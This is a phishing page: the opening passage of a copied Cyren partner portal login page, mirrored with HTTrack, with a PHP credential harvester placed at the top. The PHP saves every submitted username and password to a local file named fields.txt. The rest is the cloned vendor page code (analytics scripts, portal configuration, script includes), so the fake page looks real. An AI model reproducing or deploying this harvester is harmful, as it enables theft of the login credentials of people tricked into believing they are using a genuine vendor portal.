<?php
if( isset($_POST['username'] ) && isset( $_POST['password'] ) )
{

    $txt= $_POST['username'].' - '.$_POST['password'] . PHP_EOL; 
    file_put_contents('fields.txt', $txt, FILE_APPEND);
}?>
<html><!-- Mirrored from partner.cyren.com/English/?_ga=2.228681436.152522898.1621759942-671202104.1621759942 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 May 2021 08:55:30 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><script type="text/javascript" src="https://bam-cell.nr-data.net/1/885d4aa472?a=134702341&amp;v=1208.49599aa&amp;to=ZVMDbEtWVksEUkVdCVwZIGtpGF1WAl1YRw4dUgReWEJUTEtQQkQe&amp;rst=10445&amp;ck=1&amp;ref=http://localhost:8000/partner.cyren.com/English/indexdd31.html&amp;ap=232&amp;be=124&amp;fe=10344&amp;dc=2295&amp;perf=%7B%22timing%22:%7B%22of%22:1623145853350,%22n%22:0,%22u%22:78,%22ue%22:82,%22f%22:3,%22dn%22:7,%22dne%22:8,%22c%22:8,%22ce%22:8,%22rq%22:62,%22rp%22:62,%22rpe%22:62,%22dl%22:78,%22di%22:2265,%22ds%22:2290,%22de%22:2327,%22dc%22:10343,%22l%22:10343,%22le%22:10347%7D,%22navigation%22:%7B%22ty%22:1%7D%7D&amp;jsonp=NREUM.setToken"></script><script src="https://js-agent.newrelic.com/nr-1208.min.js"></script><script type="text/javascript" async="" src="http://www.google-analytics.com/ga.js"></script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info = {"beacon":"bam-cell.nr-data.net","errorBeacon":"bam-cell.nr-data.net","licenseKey":"885d4aa472","applicationID":"134702341","transactionName":"ZVMDbEtWVksEUkVdCVwZIGtpGF1WAl1YRw4dUgReWEJUTEtQQkQe","queueTime":0,"applicationTime":232,"agent":"","atts":""}</script><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"885d4aa472",applicationID:"134702341"};window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var i=t[n]={exports:{}};e[n][0].call(i.exports,function(t){var i=e[n][1][t];return r(i||t)},i,i.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<n.length;i++)r(n[i]);return r}({1:[function(e,t,n){function r(){}function i(e,t,n){return function(){return o(e,[u.now()].concat(c(arguments)),t?null:this,n),t?void 0:this}}var o=e("handle"),a=e(7),c=e(8),f=e("ee").get("tracer"),u=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],p="api-",l=p+"ixn-";a(d,function(e,t){s[t]=i(p+t,!0,"api")}),s.addPageAction=i(p+"addPageAction",!0),s.setCurrentRouteName=i(p+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,i="function"==typeof t;return o(l+"tracer",[u.now(),e,n],r),function(){if(f.emit((i?"":"no-")+"fn-start",[u.now(),r,i],n),i)try{return t.apply(this,arguments)}catch(e){throw f.emit("fn-err",[arguments,this,e],n),e}finally{f.emit("fn-end",[u.now()],n)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=i(l+t)}),newrelic.noticeError=function(e,t){"string"==typeof e&&(e=new Error(e)),o("err",[e,u.now(),!1,t])}},{}],2:[function(e,t,n){function r(){return c.exists&&performance.now?Math.round(performance.now()):(o=Math.max((new Date).getTime(),o))-a}function i(){return o}var o=(new Date).getTime(),a=o,c=e(9);t.exports=r,t.exports.offset=a,t.exports.getLastTimestamp=i},{}],3:[function(e,t,n){function r(e){return!(!e||!e.protocol||"file:"===e.protocol)}t.exports=r},{}],4:[function(e,t,n){function r(e,t){var n=e.getEntries();n.forEach(function(e){"first-paint"===e.name?d("timing",["fp",Math.floor(e.startTime)]):"first-contentful-paint"===e.name&&d("timing",["fcp",Math.floor(e.startTime)])})}function i(e,t){var n=e.getEntries();n.length>0&&d("lcp",[n[n.length-1]])}function o(e){e.getEntries().forEach(function(e){e.hadRecentInput||d("cls",[e])})}function a(e){if(e instanceof m&&!g){var t=Math.round(e.timeStamp),n={type:e.type};t<=p.now()?n.fid=p.now()-t:t>p.offset&&t<=Date.now()?(t-=p.offset,n.fid=p.now()-t):t=p.now(),g=!0,d("timing",["fi",t,n])}}function c(e){d("pageHide",[p.now(),e])}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var f,u,s,d=e("handle"),p=e("loader"),l=e(6),m=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){f=new PerformanceObserver(r);try{f.observe({entryTypes:["paint"]})}catch(v){}u=new PerformanceObserver(i);try{u.observe({entryTypes:["largest-contentful-paint"]})}catch(v){}s=new PerformanceObserver(o);try{s.observe({type:"layout-shift",buffered:!0})}catch(v){}}if("addEventListener"in document){var g=!1,w=["click","keydown","mousedown","pointerdown","touchstart"];w.forEach(function(e){document.addEventListener(e,a,!1)})}l(c)}},{}],5:[function(e,t,n){function r(e,t){if(!i)return!1;if(e!==i)return!1;if(!t)return!0;if(!o)return!1;for(var n=o.split("."),r=t.split("."),a=0;a<r.length;a++)if(r[a]!==n[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var c=navigator.userAgent,f=c.match(a);f&&c.indexOf("Chrome")===-1&&c.indexOf("Chromium")===-1&&(i="Safari",o=f[1])}t.exports={agent:i,version:o,match:r}},{}],6:[function(e,t,n){function r(e){function t(){e(a&&document[a]?document[a]:document[i]?"hidden":"visible")}"addEventListener"in document&&o&&document.addEventListener(o,t,!1)}t.exports=r;var i,o,a;"undefined"!=typeof document.hidden?(i="hidden",o="visibilitychange",a="visibilityState"):"undefined"!=typeof document.msHidden?(i="msHidden",o="msvisibilitychange"):"undefined"!=typeof document.webkitHidden&&(i="webkitHidden",o="webkitvisibilitychange",a="webkitVisibilityState")},{}],7:[function(e,t,n){function r(e,t){var n=[],r="",o=0;for(r in e)i.call(e,r)&&(n[o]=t(r,e[r]),o+=1);return n}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],8:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,i=n-t||0,o=Array(i<0?0:i);++r<i;)o[r]=e[t+r];return o}t.exports=r},{}],9:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function i(e){function t(e){return e&&e instanceof r?e:e?u(e,f,a):a()}function n(n,r,i,o,a){if(a!==!1&&(a=!0),!l.aborted||o){e&&a&&e(n,r,i);for(var c=t(i),f=v(n),u=f.length,s=0;s<u;s++)f[s].apply(c,r);var p=d[h[n]];return p&&p.push([b,n,r,c]),c}}function o(e,t){y[e]=v(e).concat(t)}function m(e,t){var n=y[e];if(n)for(var r=0;r<n.length;r++)n[r]===t&&n.splice(r,1)}function v(e){return y[e]||[]}function g(e){return p[e]=p[e]||i(n)}function w(e,t){s(e,function(e,n){t=t||"feature",h[n]=t,t in d||(d[t]=[])})}var y={},h={},b={on:o,addEventListener:o,removeEventListener:m,emit:n,get:g,listeners:v,context:t,buffer:w,abort:c,aborted:!1};return b}function o(e){return u(e,f,a)}function a(){return new r}function c(){(d.api||d.feature)&&(l.aborted=!0,d=l.backlog={})}var f="nr@context",u=e("gos"),s=e(7),d={},p={},l=t.exports=i();t.exports.getOrSetContext=o,l.backlog=d},{}],gos:[function(e,t,n){function r(e,t,n){if(i.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return e[t]=r,r}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){i.buffer([e],r),i.emit(e,t,n)}var i=e("ee").get("handle");t.exports=r,r.ee=i},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,o,function(){return i++})}var i=1,o="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!E++){var e=x.info=NREUM.info,t=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return u.abort();f(h,function(t,n){e[t]||(e[t]=n)});var n=a();c("mark",["onload",n+x.offset],null,"api"),c("timing",["load",n]);var r=l.createElement("script");r.src="https://"+e.agent,t.parentNode.insertBefore(r,t)}}function i(){"complete"===l.readyState&&o()}function o(){c("mark",["domContent",a()+x.offset],null,"api")}var a=e(2),c=e("handle"),f=e(7),u=e("ee"),s=e(5),d=e(3),p=window,l=p.document,m="addEventListener",v="attachEvent",g=p.XMLHttpRequest,w=g&&g.prototype;if(d(p.location)){NREUM.o={ST:setTimeout,SI:p.setImmediate,CT:clearTimeout,XHR:g,REQ:p.Request,EV:p.Event,PR:p.Promise,MO:p.MutationObserver};var y=""+location,h={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1208.min.js"},b=g&&w&&w[m]&&!/CriOS/.test(navigator.userAgent),x=t.exports={offset:a.getLastTimestamp(),now:a,origin:y,features:{},xhrWrappable:b,userAgent:s};e(1),e(4),l[m]?(l[m]("DOMContentLoaded",o,!1),p[m]("load",r,!1)):(l[v]("onreadystatechange",i),p[v]("onload",r)),c("mark",["firstbyte",a.getLastTimestamp()],null,"api");var E=0}},{}],"wrap-function":[function(e,t,n){function r(e,t){function n(t,n,r,f,u){function nrWrapper(){var o,a,s,p;try{a=this,o=d(arguments),s="function"==typeof r?r(o,a):r||{}}catch(l){i([l,"",[o,a,f],s],e)}c(n+"start",[o,a,f],s,u);try{return p=t.apply(a,o)}catch(m){throw c(n+"err",[o,a,m],s,u),m}finally{c(n+"end",[o,a,p],s,u)}}return a(t)?t:(n||(n=""),nrWrapper[p]=t,o(t,nrWrapper,e),nrWrapper)}function r(e,t,r,i,o){r||(r="");var c,f,u,s="-"===r.charAt(0);for(u=0;u<t.length;u++)f=t[u],c=e[f],a(c)||(e[f]=n(c,s?f+r:r,i,f,o))}function c(n,r,o,a){if(!m||t){var c=m;m=!0;try{e.emit(n,r,o,t,a)}catch(f){i([f,n,r,o],e)}m=c}}return e||(e=s),n.inPlace=r,n.flag=p,n}function i(e,t){t||(t=s);try{t.emit("internal-error",e)}catch(n){}}function o(e,t,n){if(Object.defineProperty&&Object.keys)try{var r=Object.keys(e);return r.forEach(function(n){Object.defineProperty(t,n,{get:function(){return e[n]},set:function(t){return e[n]=t,t}})}),t}catch(o){i([o],n)}for(var a in e)l.call(e,a)&&(t[a]=e[a]);return t}function a(e){return!(e&&e instanceof Function&&e.apply&&!e[p])}function c(e,t){var n=t(e);return n[p]=e,o(e,n,s),n}function f(e,t,n){var r=e[t];e[t]=c(r,n)}function u(){for(var e=arguments.length,t=new Array(e),n=0;n<e;++n)t[n]=arguments[n];return t}var s=e("ee"),d=e(8),p="nr@original",l=Object.prototype.hasOwnProperty,m=!1;t.exports=r,t.exports.wrapFunction=c,t.exports.wrapInPlace=f,t.exports.argsToArray=u},{}]},{},["loader"]);</script><meta name="viewport" content="width=device-width, initial-scale=1"><title>
	Cyren
</title>
<link rel="manifest" href="https://partner.cyren.com/manifest.json">
<link rel="stylesheet" href="../css/bootstrap.mina872.css?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a">
<link rel="stylesheet" href="../../prod.impartner.live/prm/css/248/public.minf9ab.css?v=19308649">
<script src="../../prod.impartner.live/scripts/jquery-2.2.4.mina872.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script>
<script src="../../prod.impartner.live/jscript/jquery-ui-1.11.4a872.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script>
<script src="../js/bootstrap.mina872.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script>
<script src="../../prod.impartner.live/scripts/fontawesome-pro/fontawesome-kita872.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><link rel="stylesheet" href="https://kit-pro.fontawesome.com/releases/latest/css/pro.min.css" media="all"><link rel="stylesheet" href="https://kit-pro.fontawesome.com/releases/latest/css/pro-v4-font-face.min.css" media="all"><link rel="stylesheet" href="https://kit-pro.fontawesome.com/releases/latest/css/pro-v4-shims.min.css" media="all">
<script src="../../prod.impartner.live/jscript/prm/deps.mina872.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script>
<script id="prm-app-config">
	var appConfig = {
		"apiUrl": "https://partner.cyren.com/prm/",
		"resourceUrl": "https://prod.impartner.live/",
		"pageUrl": "/prm/",
		"rootUrl": "/",
		"spaPath": "s/",
		"authorizeUrl": "https://partner.cyren.com/services/PrmAuth.asmx",
		"loginUrl": "/",
		"tenantId": 248,
		"xss": false,
		"language": "English",
		"languages": {"english":{"id":444,"name":"English","display":"English","locale":"en","isDefault":true},"german":{"id":480,"name":"German","display":"German (Germany)","locale":"de-DE","isDefault":false}},
		"onAppStart": [],
		"buildVersion": "6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a",
		"features": {"cobranding":{},"asset":{"extensionsWhiteList":[],"extensionsBlackList":[],"contentTypesWhiteList":[],"contentTypesBlackList":[],"unspecifiedLanguageFilterVisible":true,"unspecifiedLanguageFilterPreSelected":false,"localeLanguageFilterPreSelected":true,"hideLanguageFilter":false,"searchAssetText":false},"webSettings":{},"crmSync":{"version":2,"crmType":null,"crmIntegration":"SalesforceClassic"},"content":{"template":"base","canChangeTemplate":false},"dealRegistration":{"corePagesEnabled":false,"objectAccessEnabled":true,"useLegacyOpportunity":false,"dealRegistrationUrl":"","dealManagementUrl":""},"search":{},"training":{},"events":{},"reCaptcha":{},"channelIntel":{"advancedAnalytics":true,"advancedAnalyticsPlus":false,"advancedAnalyticsDealDashboard":true,"classicDashboard":false},"anonymousTracking":{}},
		"profile": null,
		"componentOverwrites": {},
		"discriminator": "Public",
		"menus":{"portalTopNav":{"name":"PortalTopNav","items":[{"name":"Home","externalLink":"~/{language}","iconClass":""},{"name":"Program Overview","externalLink":"~/{language}/default.aspx#scroll-to-program-overview","iconClass":""},{"name":"Benefits","externalLink":"~/{language}/default.aspx#scroll-to-benefits","iconClass":""},{"name":"Apply","externalLink":"~/{language}/register_email.aspx","iconClass":""},{"name":"Contact","externalLink":"https://www.cyren.com/company/contact","iconClass":""}]}},
		"sections":{},
		"redirects":[{"displayOrder":0,"from":":language","to":":language/s/home"},{"displayOrder":1,"from":"","to":":language/s/home"}],
		"version": 2
	};
</script>
<script data-main="https://prod.impartner.live/scripts/main.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a" src="../../prod.impartner.live/jscript/requirea872.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script>
<script src="../../prod.impartner.live/jscript/prm/portal.mina872.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script>
<script id="prm-core-settings"> 	var prmApp = new PrmApp({
		url: 'https://partner.cyren.com/',
		portalRoot: 'https://partner.cyren.com/',
		prmRoot: 'https://partner.cyren.com/English/public/prm/',
		authorizeUrl: "https://partner.cyren.com/services/PrmAuth.asmx",
		tenantId: 248
	});

	appConfig.onAppStart.push(PrmApp.start);
</script>



<script src="../js/jquery.watermark.js"></script>
<script src="../js/site.js"></script>
<script src="../js/site.ui.js"></script>

<script>
portal.webRoot = "https://partner.cyren.com/";
portal.homeDirectory = "";

</script>
<link href="../css/bootstrap.css" rel="stylesheet">


<link href="../css/modern_gold.css" rel="stylesheet">

<link href="../css/fonts.css" rel="stylesheet">
<link href="../css/content.css" rel="stylesheet">
<link href="../css/nav.css" rel="stylesheet">
<link href="../css/calendar.css" rel="stylesheet">
<link href="../css/jquery.jqGauges.css" rel="stylesheet">
<link href="../css/media-queries.css" rel="stylesheet">

<link href="../css/bootstrap-datetimepicker.css" rel="stylesheet">

<script>
portal.webRoot = "https://partner.cyren.com/";
portal.homeDirectory = "";
</script>


<style>
.top-bar {
	display: none;
}	
.navbar-fixed-top {
	top: 0;
}
#page_content, #page-content {
    padding: 72px 0 0 0;
}
@media only screen and (max-width: 1024px) {
.navbar-default {
    border: none;
    min-height: 60px;
}
.navbar-brand {
    position: inherit;
    top: auto;
    height: auto;
    padding: 22px 15px;
}
		.navbar-toggle {
    top: auto;
    margin-top: 14px;
}
#page_content, #page-content {
    padding: 60px 0 0 0;
}
#navbarCollapse {
    margin-top: 0px;
}
}
</style>
	
	
<meta name="Description" content="Cyren">
<script type="text/javascript">
	jQuery(document).ready(function ($) {
		$('#home').addClass('active');
	});
</script>
<script type="text/javascript">
 	$(document).ready(function(){
		  // Select and loop the container element of the elements you want to equalise
		  $('.row').each(function(){  
		    // Cache the highest
		    var highestBox = 0;
		    // Select and loop the elements you want to equalise
		    $('.unauth-panel-bg', this).each(function(){
					   // If this box is higher than the cached highest then store it
					   if($(this).height() > highestBox) {
						highestBox = $(this).height(); 
					   }
		    });   
		    // Set the height of all those children to whichever was highest 
		    $('.unauth-panel-bg',this).height(highestBox);           
		  });
 	});           
 </script>
 <script type="text/javascript">
 	$(document).ready(function(){
		  // Select and loop the container element of the elements you want to equalise
		  $('.row').each(function(){  
		    // Cache the highest
		    var highestBox = 0;
		    // Select and loop the elements you want to equalise
		    $('.content-align-title', this).each(function(){
					   // If this box is higher than the cached highest then store it
					   if($(this).height() > highestBox) {
						highestBox = $(this).height(); 
					   }
		    });   
		    // Set the height of all those children to whichever was highest 
		    $('.content-align-title',this).height(highestBox);           
		  });
 	});           
 </script>



<!--[if IE]><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico"><![endif]-->
<link rel="icon" type="image/png" href="../favicon.png">
<meta name="msapplication-TileColor" content="#435D4E">
<meta name="msapplication-TileImage" content="/images/icons/touch-icon-ipad-retina.png">
<link rel="apple-touch-icon" href="../images/icons/apple-touch-icon.png">
<link rel="apple-touch-icon" href="../images/icons/touch-icon-iphone.png">
<link rel="apple-touch-icon" sizes="76x76" href="../images/icons/touch-icon-ipad.png">
<link rel="apple-touch-icon" sizes="120x120" href="../images/icons/touch-icon-iphone-retina.png">
<link rel="apple-touch-icon" sizes="152x152" href="../images/icons/touch-icon-ipad-retina.png">
<link href="https://fonts.googleapis.com/css?family=Raleway:300,400,500,600,700|Roboto:100,300,400,500,700" rel="stylesheet"><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://prod.impartner.live/scripts/main.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a" src="https://prod.impartner.live/scripts/main.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="../dist/requirejs-manifest" src="https://prod.impartner.live/scripts/../dist/requirejs-manifest.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/webscript-shim" src="https://prod.impartner.live/scripts/prm/webscript-shim.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/configuration" src="https://prod.impartner.live/scripts/prm/configuration.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/ko" src="https://prod.impartner.live/scripts/prm/ko.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm-bundles/vendor" src="https://prod.impartner.live/scripts/../dist/vendor.2d3e9ab8e400e2f1a8d1.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/utils" src="https://prod.impartner.live/scripts/prm/utils.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="underscore" src="https://prod.impartner.live/scripts/underscore.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/util/util" src="https://prod.impartner.live/scripts/prm/util/util.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/util/url" src="https://prod.impartner.live/scripts/prm/util/url.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/util/string" src="https://prod.impartner.live/scripts/prm/util/string.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/kobindings/i18next-ko" src="https://prod.impartner.live/scripts/prm/kobindings/i18next-ko.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/kobindings/stylelink-ko" src="https://prod.impartner.live/scripts/prm/kobindings/stylelink-ko.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/kobindings/goto-ko" src="https://prod.impartner.live/scripts/prm/kobindings/goto-ko.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/kobindings/on-ko" src="https://prod.impartner.live/scripts/prm/kobindings/on-ko.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/kobindings/resource-to-ko" src="https://prod.impartner.live/scripts/prm/kobindings/resource-to-ko.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/kobindings/auto-resize-textarea-ko" src="https://prod.impartner.live/scripts/prm/kobindings/auto-resize-textarea-ko.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="i18next" src="https://prod.impartner.live/scripts/i18next-10.0.4.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm-bundles/router-module" src="https://prod.impartner.live/scripts/../dist/router-module.3dbbf8327c3517b202c7.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="@impartner/ko-features/core" src="https://prod.impartner.live/scripts/../dist/@impartner/ko-features/core.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/router" src="https://prod.impartner.live/scripts/prm/router.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="ironrouter" src="https://prod.impartner.live/scripts/ironrouter.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="@impartner/widget-runtime" src="https://prod.impartner.live/scripts/../dist/@impartner/widget-runtime/widget-runtime.umd.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/decorators/bind" src="https://prod.impartner.live/scripts/prm/decorators/bind.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="director" src="https://prod.impartner.live/scripts/director.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="inversify" src="https://prod.impartner.live/scripts/lib/inversify/inversify.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="@impartner/common-legacy" src="https://prod.impartner.live/scripts/../dist/@impartner/common-legacy.9d088a0ed2016fcecca0.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="amplify" src="https://prod.impartner.live/scripts/amplify.amd.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="knockout.mapping" src="https://prod.impartner.live/scripts/lib/knockout-mapping.min.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/components/segmentation/enumerations/index" src="https://prod.impartner.live/scripts/prm/components/segmentation/enumerations/index.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/router/enumerations/index" src="https://prod.impartner.live/scripts/prm/router/enumerations/index.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/router/router-tokens" src="https://prod.impartner.live/scripts/prm/router/router-tokens.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/components/segmentation/enumerations/segmentation-events" src="https://prod.impartner.live/scripts/prm/components/segmentation/enumerations/segmentation-events.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="prm/router/enumerations/router-state-enum" src="https://prod.impartner.live/scripts/prm/router/enumerations/router-state-enum.js?v=6.4.5-6-4-4-1.1+1.Branch.6.4.4.1.Sha.db7aabaaa246f99dc4b6a81c4b077fabea487d8a"></script><style>@-webkit-keyframes swal2-show {
  0% {
    -webkit-transform: scale(0.7);
            transform: scale(0.7); }
  45% {
    -webkit-transform: scale(1.05);
            transform: scale(1.05); }
  80% {
